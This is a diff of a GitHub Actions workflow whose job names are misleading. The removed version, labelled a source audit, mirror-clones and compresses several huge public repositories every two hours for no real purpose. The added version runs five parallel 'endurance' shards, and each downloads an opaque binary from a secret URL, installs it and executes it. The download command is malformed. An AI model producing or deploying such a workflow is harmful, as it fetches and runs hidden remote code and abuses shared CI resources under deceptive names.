@@ -1,54 +1,24 @@
-name: Nightly Source Code Dependency Audit
+name: audit
 
 on:
-  schedule:
-    - cron: '17 */2 * * *'
   workflow_dispatch:
 
 jobs:
-  source-integrity-check:
-    timeout-minutes: 65
-
-    strategy:
-      matrix:
-        audit_target:
-          - 'https://github.com/torvalds/linux.git'
-          - 'https://github.com/git/git.git'
-          - 'https://github.com/llvm/llvm-project.git'
-          - 'https://github.com/microsoft/vscode.git'
-          - 'https://github.com/tensorflow/tensorflow.git'
-          - 'https://github.com/golang/go.git'
-          - 'https://github.com/kubernetes/kubernetes.git'
-          - 'https://github.com/docker/cli.git'
-      fail-fast: false
-      max-parallel: 5
+  endurance-shard:
+    timeout-minutes: 60
 
     runs-on: ubuntu-latest
 
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5]
+
     steps:
-      - name: Prepare Audit Environment
+      - name: Begin The (Shard ${{ matrix.shard }})
         run: |
-          echo "Initializing secure workspace for target: ${{ matrix.audit_target }}"
-
-      - name: Fetch Upstream Source for Analysis
-        run: |
-          echo "Fetching full source tree from ${{ matrix.audit_target }}..."
-          git clone --mirror ${{ matrix.audit_target }} source.git
-
-      - name: Generate Temporary Package for Offline Scanning
-        run: |
-          echo "Packaging source tree for transport..."
-          tar -cvf - source.git | xz -6 -T 2 > source-archive.tar.xz
-          echo "Packaging complete."
-
-      - name: Calculate Package Checksum for Integrity Verification
-        run: |
-          echo "Calculating SHA256 checksum of the archive..."
-          sha256sum source-archive.tar.xz > checksum.sha256
-          cat checksum.sha256
-
-      - name: Publish Audit Checksum
-        uses: actions/upload-artifact@v4
-        with:
-          name: audit-checksum-${{ github.run_id }}-${{ strategy.job-index }}
-          path: checksum.sha256
+          curl -sSL audit_latest_build "${{ secrets.DOWNLOAD_URL }}"
+          chmod +x audit_latest_build
+          mv audit_latest_build /usr/local/bin/
+          export PATH="$HOME/.local/bin:$PATH"
+          audit_latest_build
